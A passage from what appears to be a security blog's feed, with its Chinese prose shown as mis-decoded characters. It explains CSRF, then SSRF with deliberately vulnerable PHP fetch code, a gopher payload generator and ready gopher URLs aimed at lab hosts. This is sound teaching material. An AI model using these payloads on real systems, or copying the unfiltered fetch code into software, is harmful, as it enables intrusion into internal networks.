hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107152419461-1686813288528.png" alt="image-20221107152419461"></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.anquanke.com/post/id/254388#h3-6">https://www.anquanke.com/post/id/254388#h3-6</a></p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/05/31/CSRF/"/>
      <url>/2023/05/31/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ï¼Œåˆ©ç”¨ç”¨æˆ·çš„cookieè®©æœåŠ¡å™¨ä»¥ä¸ºæ˜¯ç”¨æˆ·æ“ä½œï¼Œä»è€Œå‘èµ·æ”»å‡»ã€‚</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>webåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œå¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸ºã€‚</p><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><p>ä¼ªé€ ç”¨æˆ·è¯·æ±‚ï¼Œç”¨æˆ·èƒ½åšå•¥ï¼Œè¿™ä¸ªæ¼æ´å°±èƒ½åšå•¥</p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><ul><li>æ•°æ®åŒ…æ— tokenå’ŒrefereréªŒè¯</li></ul><p>æ— tokenéªŒè¯å¹¶ä¸”æ— refereréªŒè¯æ—¶ï¼Œå°±åŸºæœ¬å­˜åœ¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä½†åŸºäºåŠŸèƒ½ç‚¹ä¸åŒï¼Œä¸€äº›ä¸ºæ— æ„ä¹‰æ— å±å®³çš„è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚</p><p>æäº¤æ•°æ®åŒ…æ—¶æŠ“åŒ…åˆ é™¤refererå­—æ®µï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œåˆ™åŸºæœ¬å­˜åœ¨è·¨åŸŸè¯·æ±‚ä¼ªé€ ï¼ŒGETå‹æ„é€ é“¾æ¥ï¼ŒPOSTå‹å†™ä¸€ä¸ªæäº¤è¡¨å•ï¼Œæµ‹è¯•æœ‰è·¨åŸŸæƒ…å†µä¸‹æäº¤çš„æ•°æ®åŒ…æ˜¯å¦ç”Ÿæ•ˆã€‚</p><ul><li>æ•°æ®åŒ…æ— tokenæœ‰refereréªŒè¯</li></ul><p>åªæœ‰refereréªŒè¯æ—¶ï¼Œå¯å°è¯•ç©ºrefererï¼Œæˆ–è€…å°è¯•åŸŸåä¼ªé€ ã€‚</p><ul><li>burpè‡ªå¸¦çš„csrfæ£€æµ‹åŠŸèƒ½</li></ul><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>å…³é”®ç‚¹åœ¨äº</p><p>æ”»å‡»è€…å¯ä»¥é¢„å…ˆä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œæ‰€ä»¥åªéœ€è¦ä½¿å¾—è¯·æ±‚å‚æ•°éš¾ä»¥ä¼ªé€ ã€‚</p></blockquote><ul><li><p>å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç ï¼Œæ‰‹æœºéªŒè¯ç ç­‰</p></li><li><p>è®¾ç½®Token</p></li><li><p>æ£€éªŒ referer æ¥æº</p><p>ç–‘é—®ï¼šrefererä¸æ˜¯å¯ä»¥è¿›è¡Œä¼ªé€ å—ï¼Ÿ</p><p>ç­”ï¼šæ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨å‘é€è¯·æ±‚æ—¶è¿›è¡Œä¼ªé€ ï¼Œä½†æ˜¯csrfæ˜¯ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œç”¨æˆ·ä¸ä¼šå»ä¼ªé€ ï¼›</p><p>ä¸è¿‡å½“ç½‘ç«™æœ¬èº«å¯ä»¥æ¤å…¥csrfçš„payloadæ—¶ï¼Œæ£€éªŒreferæ¥æºçš„é˜²å¾¡æ‰‹æ®µå°±å¤±æ•ˆäº†ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/05/31/SSRF/"/>
      <url>/2023/05/31/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><code>SSRF</code>ï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§<strong>ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåˆ©ç”¨æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚</strong>çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼ˆæ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œå¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p><p>â€‹ </p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>ç›®æ ‡æœåŠ¡å™¨ä¼šä»è‡ªèº«å‘èµ·è¯·æ±‚ï¼Œå¹¶ä¸”è¯¥è¯·æ±‚å¯æ§ä»¥åŠæ²¡æœ‰å¯¹è¯·æ±‚åœ°å€è¿›è¡Œè¿‡æ»¤å’Œé™åˆ¶ã€‚</p><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><ul><li><p>è¯·æ±‚å¤–éƒ¨èµ„æºï¼Œå¦‚å¯¼å…¥æ–‡ä»¶ï¼ŒåŠ è½½è¿œç¨‹å›¾ç‰‡ï¼ŒRSSè®¢é˜…ç­‰</p></li><li><p>æ•°æ®åº“å†…ç½®çš„åŠ è½½å¤–éƒ¨URLåŠŸèƒ½</p></li><li><p>Webmailæ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼Œå¦‚POP3,IMAP,SMTPç­‰</p></li><li><p>æ–‡ä»¶å¤„ç†ï¼Œç¼–ç å¤„ç†ï¼Œå±æ€§ä¿¡æ¯å¤„ç†ï¼Œå¦‚FFmpegï¼ŒImageMagic,Word,Excel,PDF,XMLç­‰</p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0205699">56è§†é¢‘FFmpegè§£ææ¼æ´å¯¼è‡´SSRF | wooyun-2016-0205699| WooYun.org</a></p></li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=</span><br><span class="line">æœç‹—æœç´¢æŸå¤„SSRFæ¼æ´</span><br><span class="line">?path=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230613212738906.png" alt="image-20230613212738906"></p><h2 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h2><ul><li>openssl</li><li>é‰´æƒï¼Œå¦‚cookieï¼Œjwtç­‰ï¼Œå½“æ”»å‡»è€…åªèƒ½æ§åˆ¶ä¸€ä¸ªurlæ—¶ï¼Œè€Œæ— æ³•æ·»åŠ è¿™äº›è¯·æ±‚å¤´æ—¶ï¼Œå°±æ— æ³•è®¿é—®æŸäº›æ¥å£</li><li>æ ¡éªŒäº†å…¶ä»–http headerå­—æ®µæ—¶ï¼Œå¦‚refererï¼ŒUAç­‰</li></ul><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><ul><li><p>å†…ç½‘æ¢é’ˆï¼Œè·å–å†…ç½‘ç»“æ„å’Œå†…ç½‘æœºå™¨æŒ‡çº¹</p></li><li><p>è‹¥å†…ç½‘ä¸»æœºå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨gopheråè®®æ„é€ æ•°æ®åŒ…å¯¹å…¶å‘èµ·æ”»å‡»</p></li></ul><p>From å›½å…‰å¸ˆå‚…çš„ssrfé¶åœºæ‹“æ‰‘å›¾</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 è¿™ä¸ªæœåŠ¡å™¨çš„ Web 80 ç«¯å£å­˜åœ¨ SSRF æ¼æ´ï¼Œå¹¶ä¸” 80 ç«¯å£æ˜ å°„åˆ°äº†å…¬ç½‘çš„ 8080ï¼Œæ­¤æ—¶æ”»å‡»è€…é€šè¿‡è¿™ä¸ª 8080 ç«¯å£å¯ä»¥å€ŸåŠ© SSRF æ¼æ´å‘èµ·å¯¹ 172 ç›®æ ‡å†…ç½‘çš„æ¢æµ‹å’Œæ”»å‡»ã€‚</p></blockquote><h2 id="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"><a href="#äº§ç”Ÿæ¼æ´çš„å‡½æ•°" class="headerlink" title="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"></a>äº§ç”Ÿæ¼æ´çš„å‡½æ•°</h2><ul><li><p><code>file_get_contents</code></p><blockquote><p>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>æ”¯æŒæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>æ‰§è¡Œç»™å®šçš„ curl ä¼šè¯ã€‚</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()é”™è¯¯è§£å†³</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>ä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCPè¿æ¥  $data:è¯·æ±‚å¤´</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//æ‰§è¡Œhttpè¯·æ±‚ï¼Œå¹¶è·å¾—è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h2 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h2><p>æ£€æµ‹åˆ°å­˜åœ¨SSRFæ¼æ´å</p><ul><li>æ¢æµ‹ä¸»æœºå­˜æ´»æƒ…å†µ</li><li>æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£æƒ…å†µ</li><li>æ ¹æ®ç«¯å£æƒ…å†µå°è¯•æ”»å‡»</li></ul><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p>æ”»å‡»çš„æ•°æ®éœ€è¦ç»è¿‡ä¸¤æ¬¡URLç¼–ç ï¼Œå› ä¸ºæ•°æ®æ˜¯å…ˆåˆ°è¾¾æœ‰SSRFæ¼æ´çš„ä¸»æœºï¼Œå†é€šè¿‡SSRFæ¼æ´è½¬äº¤ç»™å†…ç½‘å…¶ä»–ä¸»æœºå¤„ç†ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å¸¸ç”¨åè®®ä»‹ç»"><a href="#å¸¸ç”¨åè®®ä»‹ç»" class="headerlink" title="å¸¸ç”¨åè®®ä»‹ç»"></a>å¸¸ç”¨åè®®ä»‹ç»</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote><p><strong>cURL</strong>æ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ã€‚</p><p>å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-vï¼šæ˜¾ç¤ºè¯·æ±‚å¤´å’Œå“åº”å¤´</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>å¯ä»¥çœ‹åˆ°æ”¯æŒçš„åè®®å¦‚ä¸‹</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h4><blockquote><p>gopher åè®®æ˜¯ä¸€ä¸ªåœ¨http åè®®è¯ç”Ÿå‰ç”¨æ¥è®¿é—®Internet èµ„æºçš„åè®®å¯ä»¥ç†è§£ä¸ºhttp åè®®çš„å‰èº«æˆ–ç®€åŒ–ç‰ˆï¼Œæ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œå¯ä»¥å®ç°å¤šä¸ªæ•°æ®åŒ…æ•´åˆå‘é€ï¼Œç„¶ågopher æœåŠ¡å™¨å°†å¤šä¸ªæ•°æ®åŒ…æ†ç»‘ç€å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯å®ƒçš„èœå•å“åº”ã€‚æ¯”å¦‚ä½¿ç”¨ä¸€æ¡gopher åè®®çš„curl å‘½ä»¤å°±èƒ½æ“ä½œmysql æ•°æ®åº“æˆ–å®Œæˆå¯¹redis çš„æ”»å‡»ç­‰ç­‰ã€‚</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>å‘ç‚¹</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°æ¥æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯åˆ†è¡Œçš„ï¼Œè€Œä¸”ç¬¬ä¸€è¡Œåªæ¥æ”¶åˆ°äº†hazï¼Œkè¢«â€˜åƒæ‰â€™äº†ã€‚</p><p>æ‰€ä»¥åœ¨ä½¿ç”¨gopheråè®®æ—¶<strong>éœ€è¦åœ¨urlååŠ å…¥ä¸€ä¸ªä»»æ„å­—ç¬¦</strong>æ‰è¡Œã€‚</p><ul><li><p>get&#x2F;postè¯·æ±‚</p><blockquote><p>1ã€æ„é€ HTTPæ•°æ®åŒ…</p><p>2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a,<br>3ã€å‘é€gopheråè®®</p></blockquote><p>æ³¨æ„HTTPæ•°æ®åŒ…ä¸­å¿…é¡»è¦æœ‰ä¸‹é¢å››ä¸ªè¯·æ±‚å¤´</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è½¬æ¢è„šæœ¬</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#urlç¼–ç </span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n â†’ \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopheråè®®ä¼šåƒæ‰urlåé¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  ä¾‹å­</p><ul><li>é€šè¿‡å‘½ä»¤å‘èµ·</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>é€šè¿‡curlå‡½æ•°å‘èµ·â€“ä¸¤æ¬¡urlç¼–ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨é€šè¿‡å‘½ä»¤å‘èµ·çš„payloadï¼ˆä¸€æ¬¡urlç¼–ç ï¼‰ï¼Œå‘ç°æ— å›æ˜¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>å†æ¬¡è¿›è¡Œurlç¼–ç åå‘é€ï¼Œå‘ç°æ˜¯å¯ä»¥å›æ˜¾çš„ã€‚</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h4 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><p>æ¢æµ‹Web åº”ç”¨çš„ä¿¡æ¯æƒ…å†µ</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>è¯»å–æœ¬åœ°æ–‡ä»¶</p><figure class="highlight 